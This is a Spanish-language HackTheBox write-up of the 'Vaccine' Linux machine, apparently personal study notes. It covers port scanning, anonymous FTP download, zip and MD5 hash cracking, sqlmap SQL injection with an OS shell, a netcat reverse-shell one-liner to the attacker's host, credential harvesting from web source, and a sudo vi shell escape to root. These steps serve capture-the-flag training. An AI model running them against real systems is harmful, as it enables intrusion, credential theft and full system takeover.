# Vaccine

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 27 de diciembre de 2024 16:56
IP: 10.129.249.41

## Recopilación de información

<aside>
💡 Reconocimiento inicial de la maquina

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.249.41 -oG allports
```

![image.png](<imagenes/image 61.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

Buscamos con los scrips de reconocimiento las versiones 

![image.png](<imagenes/image 62.png>)

- **Identificación de vulnerabilidades**
    - 21 / FTP :  vsftpd 3.0.3
    
    ```bash
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.10.14.140
    |      Logged in as ftpuser
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
    ```
    
    Enumeramos el servidor FTP. Vemos que permite conexión “anonymous” . Descargamos fichero backup.zip
    
    ```bash
    get backup.zip
    ```
    
    Descomprimimos el fichero : Nos pide password para el archivo.
    
    ```bash
    ❯ unzip backup.zip
    Archive:  backup.zip
    [backup.zip] index.php password: %       
    ```
    
    Con Zip2Johb sacamos el hash para crackear el password con John:
    
    ```bash
    zip2john backup.zip > zip.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    741852963        (backup.zip)     
    1g 0:00:00:00 DONE (2024-12-27 17:18) 25.00g/s 204800p/s 204800c/s 204800C/s 123456..whitetiger
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
    
    ```
    
    Password: **741852963**
    
    Descomprimimos el fichero y buscamos dentro del fichero “index.php” credenciales de usaurio:
    
    ```bash
    cat index.php | grep password
      if(isset($_POST['username']) && isset($_POST['password'])) {
        if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
            <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
            <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
    ```
    
    Username  : admin
    
    Password: 2cb42f8734ea607eefed3b70af13bbd3
    
    Parece un password en hash md5. Provamos de descifrar el hash con hashcat:
    
    ```bash
    hashcat 2cb42f8734ea607eefed3b70af13bbd3 -m 0 /usr/share/wordlists/rockyou.txt
    Dictionary cache built:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344392
    * Bytes.....: 139921507
    * Keyspace..: 14344385
    * Runtime...: 3 secs
    
    2cb42f8734ea607eefed3b70af13bbd3:qwerty789 
    
    ```
    
    Password: **qwerty789** 
    
    Enumeramos la web 
    
    ![image.png](<imagenes/image 63.png>)
    
    Probamos a buscar con SQLMap si es vulenrable a SQLInjections:
    
    Enumeramos las tablas
    
    ```bash
    sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --tables
    ```
    
    Enumeramos usuarios
    
    ```bash
    ❯ sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --users
    
    database management system users [1]:
    [*] postgres
    ```
    
    Con “ - - os- shell” podemos ejecutar comandos en la bd y ver los usuarios:
    
    ```bash
    
    sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --os-shell
    
    os-shell> whoami
    do you want to retrieve the command standard output? [Y/n/a] y
    [18:22:19] [INFO] retrieved: 'postgres'
    ```
    
    Buscamos los passwords con :
    
    ```bash
    sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --passwords --batch
    
    database management system users password hashes:
    [*] postgres [1]:
        password hash: md52d58e0637ec1e94cdfba3d1c26b67d01
    ```
    
    Vemos que es un MD5, probamos con hashcat:
    
    ```bash
    hashcat 2d58e0637ec1e94cdfba3d1c26b67d01 -m 0 /usr/share/wordlist/rockyou.txt
    ```
    
    No encuentra nada, por lo que buscamos el hash en [hashes.com](http://hashes.com) y encontramos :
    
    Hash :2d58e0637ec1e94cdfba3d1c26b67d01
    
    Password: **P@s5w0rd!postgres**
    
    - 80 / TCP : Apache httpd 2.4.41 ((Ubuntu))
    
    ```bash
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: MegaCorp Login
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    ```
    
    - 22/SSH : OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    
    ```bash
    22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
    |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
    |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
    ```
    

## Explotación

<aside>
💡

</aside>

### Explotación 1

Aprovechando la función de os-shell de sqlmap, mandamos una revershell:

```bash
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.140 4444 >/tmp/f
```

Obtenemos revershell:

![image.png](<imagenes/image 64.png>)

![image.png](<imagenes/image 65.png>)

Miramos que hay en la parte de la web:

Buscamos dentro la pagina dashboard.php en busca de password

```bash
postgres@vaccine:/var/www/html$ cat dashboard.php | grep "password"
	 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
(remote) postgres@vaccine:/var/www/html$ 
```

Encontramos un fichero user.txt;

User.txt: **ec9b13ca4d6229cd5cc1e09980965bf7**

### Explotación 2

### Explotación 3

## Explotación posterior

<aside>
💡 Probamos a buscar privilegios

</aside>

### Escalada de privilegios

```bash
sudo -l
(remote) postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Leemos el fichero con permiso sudo :

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
P@s5w0rd!
 #GTF OBINS : una vez dentro de vi
:set shell=/bin/sh
:shell

root@vaccine:/var/lib/postgresql/11/main\[\]$ id
uid=0(root) gid=0(root) groups=0(root)
root@vaccine:/var/lib/postgresql/11/main\[\]$ cd /root
/var/lib/postgresql/11/main\[\]$ cat root.txt
dd6e058e814260bc70e9bbdef2715849
```

Root.txt: **dd6e058e814260bc70e9bbdef2715849**

## Conclusión

<aside>
💡 Maquina facil. Aprendemos comandos SQLMap. Tener presente tema cookie para identificarse antes de enumerar. Escalada sencilla.

</aside>